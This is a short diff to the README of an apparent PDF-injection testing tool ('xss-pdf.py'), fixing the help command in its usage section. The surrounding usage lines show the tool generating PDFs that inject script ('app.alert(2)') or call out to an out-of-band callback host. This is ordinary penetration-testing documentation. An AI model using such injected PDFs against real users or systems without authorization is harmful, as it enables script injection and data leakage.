@@ -7,7 +7,7 @@ git clone https://github.com/kaanatmacaa/pdf-injection.git
 
 Usage
 ```
-python -h
+python3 xss-pdf.py -h
 python3 xss-pdf.py 
 python3 xss-pdf.py -o 1 -u http://burpsuite12345.oastify.com
 python3 xss-pdf.py -o 2 -sc app.alert(2) 
